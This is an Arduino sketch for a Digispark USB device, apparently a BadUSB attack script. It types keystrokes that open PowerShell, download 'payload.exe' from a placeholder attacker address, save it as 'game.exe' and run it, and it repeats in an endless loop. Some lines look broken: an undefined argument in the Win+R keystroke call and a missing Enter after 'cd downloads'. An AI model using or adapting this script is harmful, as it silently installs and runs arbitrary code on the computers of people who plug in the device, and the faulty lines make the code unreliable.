 #include "DigiKeyboard.h"

void setup() {}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(X, MOD_GUI_LEFT,KEY_R);
  DigiKeyboard.delay(300);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);
  DigiKeyboard.print("$source = \"http://your_ip_address/payload.exe\"");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("cd downloads");
  DigiKeyboard.delay(300);
  DigiKeyboard.print("Invoke-WebRequest -Uri $source -OutFile game.exe");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print(".\\game.exe");
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}
